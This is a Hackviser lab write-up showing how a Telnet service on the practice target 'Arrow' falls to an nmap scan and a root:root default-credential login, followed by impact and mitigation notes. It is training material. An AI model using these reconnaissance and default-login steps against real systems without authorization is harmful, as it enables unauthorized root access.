---
title: "Arrow: Telnet Default Credentials → Root Access"
date: 2026-03-29 19:00:00 +0530
categories: [Hackviser, Basic]
tags: [telnet, default-credentials, authentication, misconfiguration]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/telnet.webp
  alt: Telnet Default Credentials Exploitation
---

## Overview

This lab demonstrates a classic misconfiguration where a service is exposed with **default credentials**, leading to immediate root access.

The target machine "Arrow" runs a Telnet service that allows unauthenticated users to attempt login with weak or default credentials.

---

## Objective

- Identify exposed services
- Attempt authentication using default credentials
- Gain access to the target system

---

## Reconnaissance

Start by scanning all ports on the target machine:

```bash
nmap -p- <target_ip>
```

**Output**

```
┌──(root㉿kali)-[/home/kelvin]
└─# nmap -p- 172.20.16.16
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 07:35 -0400
Nmap scan report for 172.20.16.16 (172.20.16.16)
Host is up (0.16s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 212.83 seconds
```

Only port **23 (Telnet)** is open.

---

## Exploitation

Connect to the Telnet service:

```bash
telnet <target_ip> 23
```

**Connection Output**

```
Trying 172.20.16.16...
Connected to 172.20.16.16.
Escape character is '^]'.
Hey you, you're trying to connect to me.
You should always try default credentials like root:root

it's just beginning *_*
arrow login:
```

### Key Observation

- The prompt shows: `arrow login`
- This indicates that **"arrow"** is likely the hostname
- The system itself hints toward using default credentials

### Authentication Attempt

Try common default credentials:

```
root:root
```

**Result**

```
root@arrow:~# whoami
root

root@arrow:~# hostname
arrow
```

---

## Proof of Exploitation

- Successfully logged in via Telnet
- Obtained root-level access
- Verified using:
  - `whoami`
  - `hostname`

---

## Impact

- Full system compromise
- No authentication barrier
- Immediate privilege escalation to root
- High risk of lateral movement and persistence

---

## Mitigation

- Disable Telnet and use **SSH** instead
- Enforce strong, unique passwords
- Remove or change default credentials
- Implement account lockout policies
- Restrict remote access using firewall rules

---

## Real-World Insight

Default credentials remain one of the most common and dangerous misconfigurations in real-world environments.

Services like Telnet are especially risky because:

- They transmit data in **plaintext**
- They are often left exposed during testing or setup
- Administrators forget to harden them before deployment

Always test:

- Default credentials
- Weak password combinations
- Service misconfigurations

These simple checks can often lead to full system compromise, just like in this lab.